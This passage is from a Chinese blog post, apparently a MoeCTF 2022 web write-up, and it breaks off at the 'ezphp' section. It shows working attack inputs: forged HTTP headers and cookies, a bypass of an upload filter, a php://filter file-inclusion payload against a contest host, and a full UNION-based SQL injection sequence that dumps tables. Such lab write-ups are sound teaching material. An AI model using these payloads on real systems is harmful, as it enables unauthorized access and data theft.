@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/image/favicons/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/image/favicons/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/image/favicons/favicon-16x16.png">
+  <link rel="mask-icon" href="/image/favicons/favicon.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"paoka1.top","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"always","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"default"},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="MoeCTF 2022 Web 方向 Wp 前言MoeCTF 2022 是西电为新生举办的 CTF 比赛，题目较为简单，但其中某些题目还是很有意思的，下文为 Web 方向的 Wp ezhtml根据题目描述，F12 改变 HTML 内容，使所有科目分数之和等于总分且超过 600 即可">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MoeCTF 2022 Web Wp">
+<meta property="og:url" content="https://paoka1.top/2022/10/22/MoeCTF-2022-Web-Wp/index.html">
+<meta property="og:site_name" content="Paoka1&#39;s Blog">
+<meta property="og:description" content="MoeCTF 2022 Web 方向 Wp 前言MoeCTF 2022 是西电为新生举办的 CTF 比赛，题目较为简单，但其中某些题目还是很有意思的，下文为 Web 方向的 Wp ezhtml根据题目描述，F12 改变 HTML 内容，使所有科目分数之和等于总分且超过 600 即可">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://paoka1.top/image/post/2022/09/ezhtml.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2022/09/God_of_Aim1.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2022/09/God_of_Aim2.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2022/09/God_of_Aim3.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2022/09/What_are_you_uploading.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2022/09/inclusion.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2022/09/sqlmap_boy.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2022/09/%E6%94%AF%E4%BB%98%E7%B3%BB%E7%BB%9F1.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2022/09/%E6%94%AF%E4%BB%98%E7%B3%BB%E7%BB%9F2.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2022/09/%E6%94%AF%E4%BB%98%E7%B3%BB%E7%BB%9F3.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2022/09/%E6%94%AF%E4%BB%98%E7%B3%BB%E7%BB%9F4.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2022/09/%E6%94%AF%E4%BB%98%E7%B3%BB%E7%BB%9F5.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2022/09/%E6%94%AF%E4%BB%98%E7%B3%BB%E7%BB%9F6.png">
+<meta property="article:published_time" content="2022-10-22T12:41:10.000Z">
+<meta property="article:modified_time" content="2026-01-04T12:43:42.816Z">
+<meta property="article:author" content="Paoka1">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://paoka1.top/image/post/2022/09/ezhtml.png">
+
+
+<link rel="canonical" href="https://paoka1.top/2022/10/22/MoeCTF-2022-Web-Wp/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://paoka1.top/2022/10/22/MoeCTF-2022-Web-Wp/","path":"2022/10/22/MoeCTF-2022-Web-Wp/","title":"MoeCTF 2022 Web Wp"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>MoeCTF 2022 Web Wp | Paoka1's Blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js" defer></script>
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Paoka1's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome to my blog</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ezhtml"><span class="nav-number">2.</span> <span class="nav-text">ezhtml</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web%E5%AE%89%E5%85%A8%E4%B9%8B%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="nav-number">3.</span> <span class="nav-text">web安全之入门指北</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cookiehead"><span class="nav-number">4.</span> <span class="nav-text">cookiehead</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#God-of-Aim"><span class="nav-number">5.</span> <span class="nav-text">God_of_Aim</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#What-are-you-uploading"><span class="nav-number">6.</span> <span class="nav-text">What are you uploading</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#inclusion"><span class="nav-number">7.</span> <span class="nav-text">inclusion</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap-boy"><span class="nav-number">8.</span> <span class="nav-text">sqlmap_boy</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ezphp"><span class="nav-number">9.</span> <span class="nav-text">ezphp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#baby-unserialize"><span class="nav-number">10.</span> <span class="nav-text">baby_unserialize</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%AF%E4%BB%98%E7%B3%BB%E7%BB%9F"><span class="nav-number">11.</span> <span class="nav-text">支付系统</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Paoka1"
+      src="/image/favicons/favicon.ico">
+  <p class="site-author-name" itemprop="name">Paoka1</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/paoka1" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;paoka1" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:shauio@163.com" title="E-Mail → mailto:shauio@163.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://paoka1.top/2022/10/22/MoeCTF-2022-Web-Wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/image/favicons/favicon.ico">
+      <meta itemprop="name" content="Paoka1">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paoka1's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="MoeCTF 2022 Web Wp | Paoka1's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          MoeCTF 2022 Web Wp
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-10-22 20:41:10" itemprop="dateCreated datePublished" datetime="2022-10-22T20:41:10+08:00">2022-10-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-01-04 20:43:42" itemprop="dateModified" datetime="2026-01-04T20:43:42+08:00">2026-01-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>MoeCTF 2022 Web 方向 Wp</p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>MoeCTF 2022 是西电为新生举办的 CTF 比赛，题目较为简单，但其中某些题目还是很有意思的，下文为 Web 方向的 Wp</p>
+<h3 id="ezhtml"><a href="#ezhtml" class="headerlink" title="ezhtml"></a>ezhtml</h3><p>根据题目描述，F12 改变 HTML 内容，使所有科目分数之和等于总分且超过 600 即可</p>
+<p><img src="/image/post/2022/09/ezhtml.png" alt="ezhtml"></p>
+<span id="more"></span>
+
+<p>当然查看<code>evil.js</code>也可以：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sx = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#sx&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> yw = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#yw&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> wy = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#wy&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> zh = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#zh&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> zf = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#zf&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> arr = [sx, yw, wy, zh];</span><br><span class="line"><span class="keyword">var</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (flag == <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">clearInterval</span>(timer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        sum += <span class="built_in">eval</span>(arr[i].<span class="property">innerHTML</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (sum == <span class="built_in">eval</span>(zf.<span class="property">innerHTML</span>) &amp;&amp; sum &gt; <span class="number">600</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&#x27;moectf&#123;W3lc0me_to_theWorldOf_Web!&#125;&#x27;</span>);</span><br><span class="line">        flag = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> timer = <span class="built_in">setInterval</span>(check, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure>
+
+<p>拿到 flag：<code>moectf{W3lc0me_to_theWorldOf_Web!}</code></p>
+<h3 id="web安全之入门指北"><a href="#web安全之入门指北" class="headerlink" title="web安全之入门指北"></a>web安全之入门指北</h3><p>这个没什么说的，下载文件拿到 flag：<code>moeCTF{g3t_aUthor1zed_bef0r3_PENTEST!}</code></p>
+<h3 id="cookiehead"><a href="#cookiehead" class="headerlink" title="cookiehead"></a>cookiehead</h3><p>修改 HTTP 头和 Cookie 即可，可以使用 Hacker Bar 等工具：</p>
+<ol>
+<li><p>仅限本地访问</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加 X-Forwarded-For 头</span></span><br><span class="line">X-Forwarded-For <span class="number">127.0</span>.<span class="number">0.1</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>You are not from <a target="_blank" rel="noopener" href="http://127.0.0.1/index.php">http://127.0.0.1/index.php</a> !</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加 Referer 头</span></span><br><span class="line">Referer http:<span class="comment">//127.0.0.1/index.php</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>请先登录</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 修改 Cookie 头</span></span><br><span class="line">login <span class="number">1</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>拿到 flag：<code>moectf{th1s_is_http_protocolllll}</code></p>
+<h3 id="God-of-Aim"><a href="#God-of-Aim" class="headerlink" title="God_of_Aim"></a>God_of_Aim</h3><p>玩玩游戏能拿到一半的 flag（<code>moectf{Oh_you_can_a1m_</code>）：</p>
+<p><img src="/image/post/2022/09/God_of_Aim1.png" alt="God_of_Aim"></p>
+<p>在 HTML 里看见提示：</p>
+<p><img src="/image/post/2022/09/God_of_Aim2.png" alt="God_of_Aim"></p>
+<p>再来看看<code>aimtrainer.js</code>，发现一段和 flag 有关的 Js 代码：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">checkflag1</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>[_0x78bd[<span class="number">4</span>]] == <span class="variable language_">this</span>[_0x78bd[<span class="number">5</span>]]) &#123;</span><br><span class="line">        <span class="variable language_">this</span>[_0x78bd[<span class="number">20</span>]]();</span><br><span class="line">        <span class="title function_">alert</span>(_0x78bd[<span class="number">21</span>]);</span><br><span class="line">        <span class="title function_">alert</span>(_0x78bd[<span class="number">22</span>]);</span><br><span class="line">        <span class="variable language_">this</span>[_0x78bd[<span class="number">23</span>]]()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">checkflag2</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>[_0x78bd[<span class="number">4</span>]] == <span class="variable language_">this</span>[_0x78bd[<span class="number">5</span>]]) &#123;</span><br><span class="line">        <span class="variable language_">this</span>[_0x78bd[<span class="number">20</span>]]();</span><br><span class="line">        <span class="title function_">alert</span>(_0x78bd[<span class="number">24</span>])</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到<code>alert</code>，所以 F12 在控制台执行：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(_0x78bd[<span class="number">24</span>])</span><br></pre></td></tr></table></figure>
+
+<p>得到后半段 flag：<code>and_H4ck_Javascript}</code></p>
+<p><img src="/image/post/2022/09/God_of_Aim3.png" alt="God_of_Aim"></p>
+<p>得到 flag：<code>moectf{Oh_you_can_a1m_and_H4ck_Javascript}</code></p>
+<h3 id="What-are-you-uploading"><a href="#What-are-you-uploading" class="headerlink" title="What are you uploading"></a>What are you uploading</h3><p>随便上传一个图片，回显：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我不想要这个特洛伊文件，给我一个f1ag.php 我就给你flag!</span><br></pre></td></tr></table></figure>
+
+<p>但是直接上传<code>f1ag.php</code>会被拦，很容易发现是前端对文件后缀做了检测，上传<code>f1ag.png</code>使用 bp 把后缀名改成<code>f1ag.php</code>：</p>
+<p><img src="/image/post/2022/09/What_are_you_uploading.png" alt="What_are_you_uploading"></p>
+<p>得到 flag：<code>moectf{A0_Qua1_D0ne!}</code></p>
+<h3 id="inclusion"><a href="#inclusion" class="headerlink" title="inclusion"></a>inclusion</h3><p>打开题目发现：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;title&gt;Here<span class="string">&#x27;s a secret. Can you find it?&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if(isset($_GET[&#x27;</span>file<span class="string">&#x27;]))&#123;</span></span><br><span class="line"><span class="string">    $file = $_GET[&#x27;</span>file<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">    include($file);</span></span><br><span class="line"><span class="string">&#125;else&#123;</span></span><br><span class="line"><span class="string">    highlight_file(__FILE__);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>很容易发现是文件包含，使用伪协议读取文件，先来使用 <a target="_blank" rel="noopener" href="https://github.com/kingkaki/ctf-wscan">工具</a> 扫描目录：</p>
+<p><img src="/image/post/2022/09/inclusion.png" alt="inclusion"></p>
+<p>接下来使用伪协议读取 flag：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//82.156.5.200:1041/?file=php://filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+
+<p>得到：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHANCkhleSBoZXksIHJlYWNoIHRoZSBoaWdoZXN0IGNpdHkgaW4gdGhlIHdvcmxkISBBY3R1YWxseSBJIGFtIGlrdW4hITsNCg0KbW9lY3Rme1kwdV9hcmVfdDAwX2JhYnlfbGF9Ow0KDQo/Pg==</span><br></pre></td></tr></table></figure>
+
+<p>这一串 Base64 解码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Hey hey, reach the highest city in the world! Actually I am ikun!!;</span><br><span class="line"></span><br><span class="line">moectf&#123;Y0u_are_t00_baby_la&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到 flag：<code>moectf{Y0u_are_t00_baby_la}</code></p>
+<h3 id="sqlmap-boy"><a href="#sqlmap-boy" class="headerlink" title="sqlmap_boy"></a>sqlmap_boy</h3><p>题目看来是 SQL 注入，在 HTML 里发现提示：</p>
+<p><img src="/image/post/2022/09/sqlmap_boy.png" alt="sqlmap_boy"></p>
+<p>SQL 语句使用双引号闭合，尝试：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&quot; -- -</span></span><br><span class="line"><span class="string">// 密码随便</span></span><br></pre></td></tr></table></figure>
+
+<p>跳转到另一个页面，发现注入点<code>?id=1</code>，很简单的注入，步骤如下：</p>
+<ol>
+<li><p>确定闭合方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; // 报错</span></span><br><span class="line"><span class="string">?id=1&quot; // 正常</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> -- - <span class="comment">// 正常</span></span><br></pre></td></tr></table></figure>
+
+<p>闭合方式：单引号</p>
+</li>
+<li><p>确定字段数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; order by 3 -- - // 正常</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> order by <span class="number">4</span> -- - <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure>
+
+<p>字段数：3</p>
+</li>
+<li><p>确定回显位</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,2,3 -- -</span></span><br></pre></td></tr></table></figure>
+
+<p>看到回显位：2、3</p>
+</li>
+<li><p>爆库名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,database(),3 -- -</span></span><br></pre></td></tr></table></figure>
+
+<p>得到 moectf</p>
+</li>
+<li><p>爆表名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() -- -</span></span><br></pre></td></tr></table></figure>
+
+<p>得到 articles, flag, users</p>
+</li>
+<li><p>爆字段</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;</span>moectf<span class="string">&#x27; and table_name=&#x27;</span>flag<span class="string">&#x27; -- -</span></span><br></pre></td></tr></table></figure>
+
+<p>得到 flAg</p>
+</li>
+<li><p>获取 flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(flAg),3 from flag -- -</span></span><br></pre></td></tr></table></figure>
+
+<p>获取 flag：<code>moectf{Ar3_you_,sCr1ptboy}</code></p>
+</li>
+</ol>
+<h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><p>打开题目就看见了一段代码：</p>
